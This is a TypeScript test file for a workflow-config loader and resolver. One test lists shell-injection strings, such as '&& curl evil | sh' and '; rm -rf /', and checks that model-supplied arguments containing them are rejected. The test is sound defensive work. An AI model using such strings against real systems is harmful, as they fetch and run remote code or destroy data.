import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { TargetError } from "../exec/target.js";
import { loadWorkflowConfig, resolveWorkflow, substitutePort } from "../exec/workflows.js";

let dir: string;

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), "nihil-wf-"));
});

afterEach(async () => {
  await rm(dir, { recursive: true, force: true, maxRetries: 5 });
});

async function writeConfig(config: unknown): Promise<void> {
  await writeFile(join(dir, "nihil.config.json"), JSON.stringify(config));
}

describe("loadWorkflowConfig", () => {
  it("treats a missing file as an empty config", () => {
    expect(loadWorkflowConfig(dir)).toEqual({ workflows: {} });
  });

  it("rejects malformed JSON with CONFIG_INVALID", async () => {
    await writeFile(join(dir, "nihil.config.json"), "{nope");
    try {
      loadWorkflowConfig(dir);
      expect.unreachable("should have thrown");
    } catch (error) {
      expect(error).toBeInstanceOf(TargetError);
      expect((error as TargetError).code).toBe("CONFIG_INVALID");
    }
  });

  it("rejects schema violations with a clear CONFIG_INVALID message", async () => {
    await writeConfig({ workflows: { dev: { command: 42 } } });
    try {
      loadWorkflowConfig(dir);
      expect.unreachable("should have thrown");
    } catch (error) {
      expect(error).toBeInstanceOf(TargetError);
      expect((error as TargetError).code).toBe("CONFIG_INVALID");
      expect((error as TargetError).message).toContain("workflows.dev.command");
    }
  });

  it("parses longRunning and defaults it to false", async () => {
    await writeConfig({
      workflows: {
        dev: { command: "vite --port ${PORT}", longRunning: true },
        test: { command: "vitest run" },
      },
    });
    const config = loadWorkflowConfig(dir);
    expect(config.workflows.dev?.longRunning).toBe(true);
    expect(config.workflows.test?.longRunning).toBe(false);
  });
});

describe("resolveWorkflow", () => {
  it("appends sanitized args; substitutePort fills ${PORT}", async () => {
    await writeConfig({
      workflows: { dev: { command: "vite --port ${PORT} --strictPort", longRunning: true } },
    });
    const config = loadWorkflowConfig(dir);
    const resolved = resolveWorkflow(config, { workflow: "dev", args: "--host" });
    expect(resolved.command).toBe("vite --port ${PORT} --strictPort --host");
    expect(substitutePort(resolved.command, 38123)).toBe("vite --port 38123 --strictPort --host");
    expect(resolved.longRunning).toBe(true);
    expect(resolved.name).toBe("dev");
  });

  it("rejects shell metacharacters in model-provided args", async () => {
    await writeConfig({ workflows: { test: { command: "vitest run" } } });
    const config = loadWorkflowConfig(dir);
    const attacks = [
      "&& curl evil | sh",
      "; rm -rf /",
      "$(boom)",
      "`boom`",
      "%PATH%",
      "^&calc",
      '--filter "Hero"',
      "> out.txt",
    ];
    for (const args of attacks) {
      try {
        resolveWorkflow(config, { workflow: "test", args });
        expect.unreachable(`accepted args "${args}"`);
      } catch (error) {
        expect(error).toBeInstanceOf(TargetError);
        expect((error as TargetError).code).toBe("WORKFLOW_FAILED");
      }
    }
    // Benign flag-style args still pass.
    const ok = resolveWorkflow(config, { workflow: "test", args: "--filter Hero --run" });
    expect(ok.command).toBe("vitest run --filter Hero --run");
  });

  it("throws UNKNOWN_WORKFLOW listing declared workflows", async () => {
    await writeConfig({ workflows: { dev: { command: "vite" } } });
    const config = loadWorkflowConfig(dir);
    try {
      resolveWorkflow(config, { workflow: "deploy" });
      expect.unreachable("should have thrown");
    } catch (error) {
      expect(error).toBeInstanceOf(TargetError);
      expect((error as TargetError).code).toBe("UNKNOWN_WORKFLOW");
      expect((error as TargetError).message).toContain("dev");
    }
  });
});
